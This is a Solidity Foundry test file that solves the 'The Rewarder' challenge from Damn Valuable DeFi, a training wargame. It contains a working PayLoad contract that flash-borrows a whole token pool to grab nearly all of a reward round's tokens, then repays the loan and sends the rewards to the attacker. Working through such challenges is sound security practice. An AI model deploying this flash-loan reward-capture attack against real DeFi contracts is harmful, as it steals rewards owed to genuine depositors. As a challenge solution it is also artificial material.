// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "./utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../the-rewarder/RewardToken.sol";
import {AccountingToken} from "../the-rewarder/AccountingToken.sol";
import {FlashLoanerPool} from "../the-rewarder/FlashLoanerPool.sol";


contract PayLoad {
    uint public falshloan_amount;
    FlashLoanerPool flashLoanpool;
    TheRewarderPool rewarderpool;
    DamnValuableToken dvt;
    address public attacker;

    constructor (FlashLoanerPool _flashLoanPooladdr, TheRewarderPool _rewarderPooladdr, DamnValuableToken _DamnValuableTokenaddr) {
        flashLoanpool = _flashLoanPooladdr;
        rewarderpool = _rewarderPooladdr;
        dvt = _DamnValuableTokenaddr;
        attacker = msg.sender;
    }

    function startAttack() public {
        falshloan_amount = dvt.balanceOf(address(flashLoanpool));
        flashLoanpool.flashLoan(falshloan_amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        dvt.approve(address(rewarderpool), falshloan_amount);
        rewarderpool.deposit(falshloan_amount);
        rewarderpool.withdraw(falshloan_amount);
        dvt.transfer(address(flashLoanpool), amount);
        rewarderpool.rewardToken().transfer(attacker, rewarderpool.rewardToken().balanceOf(address(this)));
    }
}

contract TheRewarder is Test {
    uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
    uint256 internal constant USER_DEPOSIT = 100e18;

    Utilities internal utils;
    FlashLoanerPool internal flashLoanerPool;
    TheRewarderPool internal theRewarderPool;
    PayLoad internal payload;
    DamnValuableToken internal dvt;
    address payable[] internal users;
    address payable internal attacker;
    address payable internal alice;
    address payable internal bob;
    address payable internal charlie;
    address payable internal david;

 function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];
        attacker = users[4];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        flashLoanerPool = new FlashLoanerPool(address(dvt));
        vm.label(address(flashLoanerPool), "Flash Loaner Pool");

        // Set initial token balance of the pool offering flash loans
        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);

        theRewarderPool = new TheRewarderPool(address(dvt));

        // Alice, Bob, Charlie and David deposit 100 tokens each
        for (uint8 i; i < 4; i++) {
            dvt.transfer(users[i], USER_DEPOSIT);
            vm.startPrank(users[i]);
            dvt.approve(address(theRewarderPool), USER_DEPOSIT);
            theRewarderPool.deposit(USER_DEPOSIT);
            assertEq(
                theRewarderPool.accToken().balanceOf(users[i]),
                USER_DEPOSIT
            );
            vm.stopPrank();
        }

        assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * 4);
        assertEq(theRewarderPool.rewardToken().totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        vm.warp(block.timestamp + 5 days); // 5 days

        for (uint8 i; i < 4; i++) {
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            assertEq(
                theRewarderPool.rewardToken().balanceOf(users[i]),
                25e18 // Each depositor gets 25 reward tokens
            );
        }

        assertEq(theRewarderPool.rewardToken().totalSupply(), 100e18);
        assertEq(dvt.balanceOf(attacker), 0); // Attacker starts with zero DVT tokens in balance
        assertEq(theRewarderPool.roundNumber(), 2); // Two rounds should have occurred so far


    }
    //address _flashLoanPooladdr, address _rewarderPooladdr, address _DamnValuableTokenaddr, address _RewardTokenaddr
    function testExploit() public {
        utils.mineTime(5 days);
        vm.startPrank(attacker);
        payload = new PayLoad(flashLoanerPool, theRewarderPool, dvt);
        payload.startAttack();
        vm.stopPrank();
        verify();
    }

    function verify() internal {
        assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
        for (uint8 i; i < 4; i++) {
            // Users should get negligible rewards this round
            vm.prank(users[i]);
            theRewarderPool.distributeRewards();
            uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(
                users[i]
            );
            uint256 delta = rewardPerUser - 25e18;
            assertLt(delta, 1e16);
        }
        // Rewards must have been issued to the attacker account
        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
        uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(
            attacker
        );

        // The amount of rewards earned should be really close to 100 tokens
        uint256 deltaAttacker = 100e18 - rewardAttacker;
        assertLt(deltaAttacker, 1e17);

        // Attacker finishes with zero DVT tokens in balance
        assertEq(dvt.balanceOf(attacker), 0);
    }
}
